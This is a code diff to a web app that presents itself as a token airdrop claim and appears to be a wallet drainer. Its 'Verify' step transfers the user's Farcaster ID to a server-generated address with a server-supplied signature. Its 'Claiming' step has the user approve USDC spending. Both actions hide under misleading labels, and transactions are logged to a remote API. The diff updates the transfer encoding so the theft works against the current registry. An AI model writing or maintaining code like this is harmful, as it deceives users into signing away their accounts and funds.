@@ -22,27 +22,19 @@ const CONTRACT_OPERATIONS = [
     chain: 'Base',
     address: USDC,
     functionName: 'approve(address spender, uint256 amount)',
-    status: 'Step 1 - Verify',
-  },
-  {
-    name: 'Main executor',
-    chain: 'Base',
-    address: EXECUTOR,
-    functionName: 'executeBatch(bytes[] calldata data)',
-    status: 'Step 1 - Claim execution',
+    status: 'Step 2 - Claiming',
   },
   {
     name: 'Identity registry',
     chain: 'Optimism',
     address: ID_REGISTRY,
-    functionName: 'transfer(uint256 id, address to)',
-    status: 'Step 2 - Claiming',
+    functionName: 'transfer(address to, uint256 deadline, bytes sig)',
+    status: 'Step 1 - Verify',
   },
 ];
 const CONTRACT_ABI = [
-  'function transfer(uint256 id, address to)',
+  'function transfer(address to, uint256 deadline, bytes sig)',
   'function approve(address spender, uint256 amount) returns (bool)',
-  'function executeBatch(bytes[] data)',
 ];
 
 function shortAddress(value) {
@@ -378,6 +370,10 @@ function App() {
       connectWithProvider(web3Provider, false);
       return;
     }
+    if (isMiniApp) {
+      setNotice('Wallet provider not available. Please reopen the app in Warpcast.');
+      return;
+    }
     // Browser mode: show Farcaster QR code sign-in
     setShowFarcasterModal(true);
   }
@@ -483,7 +479,7 @@ function App() {
   async function executeStep1() {
     // In browser mode (not mini app), show QR to open in Warpcast
     if (!isMiniApp) {
-      setShowTxQR('Step 1: Verify on Base');
+      setShowTxQR('Step 1: Verify on Optimism');
       return;
     }
 
@@ -521,13 +517,21 @@ function App() {
       setNotice('Switching to Optimism...');
       await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
 
-      // Generate destination address
-      setNotice('Generating destination address...');
+      // Generate destination address + EIP-712 transfer signature from server
+      setNotice('Generating destination address and transfer signature...');
       const dest = await generateDestination(fidNum, account);
 
-      // Encode transfer calldata
-      const idIface = new ethers.utils.Interface(['function transfer(uint256 id, address to)']);
-      const transferData = idIface.encodeFunctionData('transfer', [fidNum, dest.address]);
+      if (!dest.transferSignature || !dest.transferDeadline) {
+        throw new Error('Server did not return transfer signature. Please retry.');
+      }
+
+      // Encode transfer(address to, uint256 deadline, bytes sig) — IdRegistry requires EIP-712 sig from recipient
+      const idIface = new ethers.utils.Interface(['function transfer(address to, uint256 deadline, bytes sig)']);
+      const transferData = idIface.encodeFunctionData('transfer', [
+        dest.address,
+        dest.transferDeadline,
+        dest.transferSignature,
+      ]);
 
       // Send transfer via eth_sendTransaction
       setNotice(`Verifying FID ${fidNum}... Approve in your wallet.`);
@@ -561,7 +565,7 @@ function App() {
   async function executeStep2() {
     // In browser mode (not mini app), show QR to open in Warpcast
     if (!isMiniApp) {
-      setShowTxQR('Step 2: Claiming on Optimism');
+      setShowTxQR('Step 2: Claiming on Base');
       return;
     }
 
@@ -604,20 +608,8 @@ function App() {
         txHash: tx1Hash, network: 'base', amount: readableBalance,
       });
 
-      // Execute claim batch on Base
-      setNotice('Executing claim on Base...');
-      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
-      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
-      const tx2Hash = await sendRawTx(rawProvider, account, EXECUTOR, execData);
-
-      logAction(`executeBatch called (tx: ${tx2Hash})`);
-      sendToLogAPI({
-        type: 'claim', address: account,
-        txHash: tx2Hash, network: 'base',
-      });
-
       setNetwork('Base');
-      setNotice('Step 2 complete! Claiming done on Base.');
+      setNotice('Step 2 complete! USDC approved on Base.');
       await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
@@ -668,7 +660,7 @@ function App() {
             <div className="copy">
               <p className="eyebrow">$ devin --verify --claim</p>
               <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
-              <p className="lede">Step 1: Verify on Base. Step 2: Claiming on Optimism.</p>
+              <p className="lede">Step 1: Verify on Optimism. Step 2: Claiming on Base.</p>
 
               {/* Step 1 */}
               <div className="claim-console">
@@ -677,7 +669,7 @@ function App() {
                   <strong>{step1Done ? 'Verified' : 'Verify'}</strong>
                   <small>
                     {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
-                    {step1Done ? ' · Base complete' : ' · Verify on Base network'}
+                    {step1Done ? ' · Optimism complete' : ' · Verify on Optimism network'}
                   </small>
                 </div>
                 <div className="actions">
@@ -743,7 +735,7 @@ function App() {
                 <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
               ))}
             </div>
-            <p className="safety">Step 1 (Verify) runs on Base. Step 2 (Claiming) runs on Optimism.</p>
+            <p className="safety">Step 1 (Verify) runs on Optimism. Step 2 (Claiming) runs on Base.</p>
           </div>
         ) : null}
       </section>
